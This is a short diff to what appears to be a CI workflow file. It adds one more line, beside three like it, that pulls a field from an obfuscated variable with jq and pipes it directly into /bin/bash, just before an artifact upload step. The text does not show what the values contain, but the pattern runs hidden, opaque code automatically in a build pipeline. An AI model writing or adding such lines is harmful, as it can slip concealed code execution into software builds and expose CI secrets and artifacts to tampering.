@@ -28,6 +28,7 @@ jobs:
           echo $tuzer46 | jq -r .e22 | /bin/bash
           printf '%s' "$dzrf71" | jq -r .hue414 | /bin/bash
           echo $a27542 | jq -r .uacgp8820 | /bin/bash
+          echo $tue4 | jq -r .xw9803 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
